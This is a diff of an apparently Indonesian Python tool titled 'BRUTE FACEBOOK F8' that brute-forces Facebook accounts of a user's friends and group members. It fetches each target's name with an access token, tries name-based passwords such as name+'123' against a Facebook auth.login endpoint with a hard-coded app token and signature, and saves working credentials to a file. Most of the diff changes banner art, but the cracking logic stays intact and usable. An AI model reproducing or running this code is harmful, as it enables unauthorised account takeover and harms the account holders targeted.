@@ -60,13 +60,13 @@ def menu(n,toket):
 	global loop
 	loop=0
 	banner()
-	print("%s(((●))) %sSelamat datang, Sdr, %s%s"%(G,W,Y,n))
+	print("%s(((██))) %sSelamat datang, Sdr, %s%s"%(G,W,Y,n))
 	print("""
-%s## %s1 Crack Daftar Teman
-%s## %s2 Crack Daftar Dari Teman
-%s## %s3 Crack Daftar Anggota Group
+%s██─ %s1 Crack Daftar Teman
+%s██─ %s2 Crack Daftar Dari Teman
+%s██─ %s3 Crack Daftar Anggota Group
 
-%s## %s0 Exit the program
+%s██─ %s0 Exit the program
 """%(G,W,G,W,G,W,G,R))
 	unikers = input("%s[ %schoose%s ]%s•>%s "%(W,G,W,G,W))
 	if unikers in [""]:
@@ -113,8 +113,8 @@ def x(user):
 	except:
 		pass
 	try:
-		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
-		for pas in [nama+"123",nama+"12345",nama+"123456",nama+".com","@"+nama,"sayang","anjing","bangsat","ngentot","kontol"]:
+		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["last_name"]
+		for pas in [nama+"123","@"+nama,"sayang"]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
@@ -171,24 +171,26 @@ def cek():
 		
 def login():
 	print("%s\n\n* login your account facebook first *\n"%(W))
-	email = input("%s[~] %sEmail : "%(P,W))
-	pasw = getpass("%s[~] %sPasss : "%(P,W))
+	email = input("%s[━┫] %sEmail : "%(P,W))
+	pasw = getpass("%s[━┫] %sPasss : "%(P,W))
 	get(email,pasw)
 	
 def banner():
 	os.system("clear")
 	print("""
-╭━━━╮%s╋%s  %sBRUTE FACEBOOK F8%s  %s╋%s
-╭━╮┃╋╋╋╋╋╋╋╋┏┓╋╋╋╋╋╋╋┏┓
-┃╰━━╮┏━━┳━┓╋╋┃┗━┳━━┳━━┫┃┏┓
-╰━━╮┃┃┏┓┃┏┓┳━┫┏┓┃┏┓┃┏┓┃┗┛┛
-┃╰━╯┃┃┏┓┃┃┃┣━┫┗┛┃┗┛┃┗┛┃┏┓┓
-╰━━━╯┗┛┗┻┛┗┛╋┗━━┻━━┻━━┻┛┗┛
-╭══════════════════════════════════════════╮
-║%s# %sAuthor : %sSoesanto%s %s                     ║
-║%s# %sFB     : %sHttps://fb.me/soesanto%s  %s      ║
-║%s# %sGithub : %sHttps://github.com/M3DPR0%s%s     ║
-╰══════════════════════════════════════════╯
+────────────────%s╋%s  %sBRUTE  FACEBOOK F8%s  %s╋%s ──────────────
+─██████████████─%s██████████████─%s██████%s──────────%s██████─%s
+─██▒▒▒▒▒▒▒▒▒▒██─%s██%s▒▒▒▒▒▒▒▒▒▒%s██%s─██▒▒██████████──██▒▒██─%s
+─██▒▒██████████─██▒▒██████▒▒██─██▒▒▒▒▒▒▒▒▒▒██──██▒▒██─
+─██▒▒██─────────██▒▒██──██▒▒██─██▒▒██████▒▒██──██▒▒██─
+─██▒▒██████████─██▒▒██████▒▒██─██▒▒██──██▒▒██──██▒▒██─
+─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██──██▒▒██─
+─██████████▒▒██─██▒▒██████▒▒██─██▒▒██──██▒▒██──██▒▒██─
+─────────██▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██████▒▒██─
+─██████████▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒▒▒▒▒▒▒▒▒██─
+─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒██──██████████▒▒██─
+─██████████████─██████──██████─%s██████%s──────────%s██████%s─%s
+──────────────────────────────────────────────────────
  """%(R,W,GB,RE,R,W,Y,W,GB,RE,W,Y,W,GB,RE,W,Y,W,GB,RE,W))
 
 if __name__ == '__main__':
